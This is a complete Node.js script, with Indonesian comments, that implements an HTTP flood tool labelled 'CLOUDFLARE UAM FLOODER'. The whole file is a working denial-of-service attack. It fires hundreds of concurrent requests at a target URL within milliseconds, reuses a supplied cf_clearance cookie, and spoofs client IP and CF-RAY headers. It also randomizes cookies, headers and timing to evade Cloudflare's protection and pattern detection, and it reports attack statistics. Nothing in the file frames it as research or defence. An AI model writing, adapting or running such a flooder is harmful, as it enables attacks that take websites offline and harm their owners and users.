const http = require('http');
const https = require('https');
const { URL } = require('url');
const zlib = require('zlib');

// Ambil argumen dari command line
const args = process.argv.slice(2);
const targetUrl = args[0];
const duration = parseInt(args[1]) * 1000;
const cfCookie = args[2];
const userAgent = args[3];
const method = args[4].toUpperCase();

// Parse URL
const parsedUrl = new URL(targetUrl);
const isHttps = parsedUrl.protocol === 'https:';
const port = parsedUrl.port || (isHttps ? 443 : 80);
const hostname = parsedUrl.hostname;

// Enhanced headers untuk Cloudflare UAM
const baseHeaders = {
  'User-Agent': userAgent,
  'Cookie': cfCookie,
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
  'Accept-Encoding': 'gzip, deflate, br',
  'Connection': 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'none',
  'Sec-Fetch-User': '?1',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'TE': 'trailers',
  'DNT': '1',
};

// Tambahkan header Cloudflare spesifik
const cloudflareHeaders = {
  'CF-Connecting-IP': generateRandomIP(),
  'X-Forwarded-For': generateRandomIP(),
  'CF-RAY': generateRandomRay(),
  'CF-Visitor': '{"scheme":"https"}',
  'CF-Cache-Status': 'DYNAMIC',
  'CDN-Loop': 'cloudflare',
};

// Counter untuk statistik
let requestCount = 0;
let successCount = 0;
let errorCount = 0;
let blockedCount = 0;
let challengeCount = 0;
let startTime = Date.now();
let totalBytes = 0;

// Warna untuk console
const colors = {
  reset: '\x1b[0m',
  cyan: '\x1b[36m',
  yellow: '\x1b[33m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m'
};

console.log(`${colors.magenta}[CLOUDFLARE UAM FLOODER]${colors.reset}`);
console.log(`${colors.cyan}[TARGET]${colors.reset} ${targetUrl}`);
console.log(`${colors.cyan}[METHOD]${colors.reset} ${method}`);
console.log(`${colors.cyan}[COOKIE]${colors.reset} cf_clearance: ${cfCookie.substring(0, 30)}...`);
console.log(`${colors.cyan}[DURATION]${colors.reset} ${duration/1000}s\n`);

// Fungsi untuk generate random IP
function generateRandomIP() {
  const ranges = [
    [1, 255], [0, 255], [0, 255], [0, 255] // IPv4 ranges
  ];
  return ranges.map(range => Math.floor(Math.random() * (range[1] - range[0] + 1) + range[0])).join('.');
}

// Fungsi untuk generate random CF-Ray ID
function generateRandomRay() {
  const chars = 'abcdef0123456789';
  let ray = '';
  for (let i = 0; i < 16; i++) {
    ray += chars[Math.floor(Math.random() * chars.length)];
  }
  return `${ray}-CGK`;
}

// Fungsi untuk generate random session
function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}

// Fungsi untuk parse cookies
function parseCookies(cookieString) {
  if (!cookieString) return {};
  
  const cookies = {};
  cookieString.split(';').forEach(cookie => {
    const parts = cookie.split('=');
    const name = parts[0].trim();
    const value = parts[1] || '';
    cookies[name] = value;
  });
  return cookies;
}

// Parse existing cookies
const existingCookies = parseCookies(cfCookie);

// Rotate cookies untuk setiap request
function rotateCookies() {
  const cookies = { ...existingCookies };
  
  // Tambah random cookies yang biasa digunakan Cloudflare
  cookies['__cfduid'] = generateSessionId();
  cookies['_cfuvid'] = generateSessionId();
  cookies['cf_clearance'] = existingCookies['cf_clearance'] || cfCookie.replace('cf_clearance=', '');
  cookies['__cflb'] = Math.floor(Math.random() * 1000000).toString();
  
  // Convert back to string
  return Object.entries(cookies)
    .map(([name, value]) => `${name}=${value}`)
    .join('; ');
}

// Fungsi untuk randomize headers
function randomizeHeaders() {
  const randomIP = generateRandomIP();
  const headers = { ...baseHeaders, ...cloudflareHeaders };
  
  // Randomize some headers
  headers['CF-Connecting-IP'] = randomIP;
  headers['X-Forwarded-For'] = randomIP;
  headers['CF-RAY'] = generateRandomRay();
  headers['Cookie'] = rotateCookies();
  
  // Random Accept-Language
  const languages = ['en-US,en;q=0.9', 'id,en;q=0.9', 'en-GB,en;q=0.8', 'en;q=0.9'];
  headers['Accept-Language'] = languages[Math.floor(Math.random() * languages.length)];
  
  // Kadang-kadang tambah header Referer
  if (Math.random() > 0.7) {
    headers['Referer'] = `https://${hostname}/`;
  }
  
  return headers;
}

// Fungsi untuk decompress response
function decompressResponse(response, body, callback) {
  const contentEncoding = response.headers['content-encoding'];
  
  if (contentEncoding === 'gzip') {
    zlib.gunzip(body, (err, decompressed) => {
      callback(err, decompressed ? decompressed.toString() : body.toString());
    });
  } else if (contentEncoding === 'deflate') {
    zlib.inflate(body, (err, decompressed) => {
      callback(err, decompressed ? decompressed.toString() : body.toString());
    });
  } else if (contentEncoding === 'br') {
    zlib.brotliDecompress(body, (err, decompressed) => {
      callback(err, decompressed ? decompressed.toString() : body.toString());
    });
  } else {
    callback(null, body.toString());
  }
}

// Fungsi untuk send request dengan retry mechanism
function sendRequest(retryCount = 0) {
  const requestStart = Date.now();
  const requester = isHttps ? https : http;
  const headers = randomizeHeaders();
  
  // Random delay antar request dalam satu batch
  setTimeout(() => {
    const options = {
      hostname: hostname,
      port: port,
      path: parsedUrl.pathname + parsedUrl.search + (method === 'GET' ? `&_=${Date.now()}` : ''),
      method: method,
      headers: headers,
      timeout: 10000, // 10 second timeout
    };

    const req = requester.request(options, (res) => {
      const chunks = [];
      
      res.on('data', (chunk) => {
        chunks.push(chunk);
        totalBytes += chunk.length;
      });
      
      res.on('end', () => {
        const body = Buffer.concat(chunks);
        const responseTime = Date.now() - requestStart;
        
        // Decompress response jika perlu
        decompressResponse(res, body, (err, responseBody) => {
          requestCount++;
          
          // Deteksi Cloudflare challenge
          const isCloudflareChallenge = responseBody && (
            responseBody.includes('cf-browser-verification') ||
            responseBody.includes('cf-challenge') ||
            responseBody.includes('just a moment') ||
            responseBody.includes('Checking your browser') ||
            responseBody.includes('DDoS protection') ||
            responseBody.includes('Attention Required') ||
            res.headers['cf-chl-bypass'] ||
            res.headers['cf-mitigated'] === 'challenge'
          );
          
          // Deteksi block
          const isBlocked = responseBody && (
            responseBody.includes('access denied') ||
            responseBody.includes('blocked') ||
            res.statusCode === 403 ||
            res.statusCode === 429
          );
          
          if (isCloudflareChallenge) {
            challengeCount++;
            if (requestCount % 10 === 0) {
              console.log(`${colors.yellow}[CHALLENGE ${challengeCount}]${colors.reset} Status: ${res.statusCode} | Time: ${responseTime}ms`);
            }
          } else if (isBlocked) {
            blockedCount++;
            if (requestCount % 10 === 0) {
              console.log(`${colors.red}[BLOCKED ${blockedCount}]${colors.reset} Status: ${res.statusCode} | Time: ${responseTime}ms`);
            }
          } else if (res.statusCode >= 200 && res.statusCode < 400) {
            successCount++;
            if (requestCount % 50 === 0) {
              console.log(`${colors.green}[SUCCESS]${colors.reset} #${requestCount} | ${res.statusCode} | ${responseTime}ms`);
            }
          } else {
            errorCount++;
          }
          
          // Log untuk status code tertentu
          if (requestCount % 100 === 0 || (res.statusCode !== 200 && res.statusCode !== 403)) {
            console.log(`${colors.blue}[${res.statusCode}]${colors.reset} Request #${requestCount} | ${responseTime}ms | ${Math.round(totalBytes/1024)}KB`);
          }
        });
      });
    });

    req.on('error', (err) => {
      errorCount++;
      requestCount++;
      
      if (requestCount % 20 === 0) {
        console.log(`${colors.red}[ERROR]${colors.reset} ${err.code} | Total: ${errorCount}`);
      }
      
      // Retry jika error koneksi
      if (retryCount < 3 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT')) {
        setTimeout(() => sendRequest(retryCount + 1), 100);
      }
    });

    req.on('timeout', () => {
      req.destroy();
    });

    // Untuk POST request, kirim data
    if (method === 'POST') {
      const postData = JSON.stringify({
        timestamp: Date.now(),
        random: Math.random().toString(36),
        session: generateSessionId(),
        data: 'x'.repeat(Math.floor(Math.random() * 100) + 50)
      });
      
      options.headers['Content-Type'] = 'application/json';
      options.headers['Content-Length'] = Buffer.byteLength(postData);
      req.write(postData);
    }

    req.end();
  }, Math.random() * 50); // Random delay 0-50ms
}

// Fungsi untuk membuat banyak koneksi simultan dengan pattern berbeda
function flood() {
  // Dynamic concurrency based on response time
  const baseConcurrency = 100;
  const dynamicConcurrency = baseConcurrency + Math.floor(Math.random() * 50);
  
  // Kirim request dalam batch dengan pattern random
  for (let i = 0; i < dynamicConcurrency; i++) {
    // Random delay antar request dalam batch
    setTimeout(() => {
      sendRequest();
    }, Math.random() * 25);
  }
}

// Interval untuk statistik detail
const statsInterval = setInterval(() => {
  const elapsed = (Date.now() - startTime) / 1000;
  const rate = requestCount / elapsed;
  const successRate = successCount / requestCount * 100 || 0;
  
  console.log(`\n${colors.magenta}[STATS @ ${elapsed.toFixed(1)}s]${colors.reset}`);
  console.log(`  Total Requests: ${requestCount}`);
  console.log(`  Rate: ${rate.toFixed(0)} req/s`);
  console.log(`  Success: ${successCount} (${successRate.toFixed(1)}%)`);
  console.log(`  Challenges: ${challengeCount}`);
  console.log(`  Blocked: ${blockedCount}`);
  console.log(`  Errors: ${errorCount}`);
  console.log(`  Bandwidth: ${(totalBytes / 1024 / 1024).toFixed(2)} MB`);
  console.log(`  Success/Challenge: ${successCount}/${challengeCount}\n`);
  
}, 3000);

// Variasi interval flood untuk menghindari pattern detection
function scheduleFlood() {
  flood();
  
  // Random interval between 5-15ms
  const nextInterval = Math.random() * 10 + 5;
  floodTimer = setTimeout(scheduleFlood, nextInterval);
}

let floodTimer = setTimeout(scheduleFlood, 10);

// Hentikan setelah durasi yang ditentukan
setTimeout(() => {
  clearTimeout(floodTimer);
  clearInterval(statsInterval);
  
  const totalTime = (Date.now() - startTime) / 1000;
  const avgRate = requestCount / totalTime;
  
  console.log(`\n${colors.magenta}[ATTACK COMPLETED]${colors.reset}`);
  console.log(`${colors.cyan}════════════════════════════════════${colors.reset}`);
  console.log(`Duration: ${totalTime.toFixed(1)} seconds`);
  console.log(`Total Requests: ${requestCount}`);
  console.log(`Average Rate: ${avgRate.toFixed(0)} req/s`);
  console.log(`Successful: ${successCount}`);
  console.log(`Cloudflare Challenges: ${challengeCount}`);
  console.log(`Blocked: ${blockedCount}`);
  console.log(`Errors: ${errorCount}`);
  console.log(`Total Bandwidth: ${(totalBytes / 1024 / 1024).toFixed(2)} MB`);
  console.log(`Success Rate: ${(successCount/requestCount*100).toFixed(1)}%`);
  console.log(`${colors.cyan}════════════════════════════════════${colors.reset}`);
  
  process.exit(0);
}, duration);
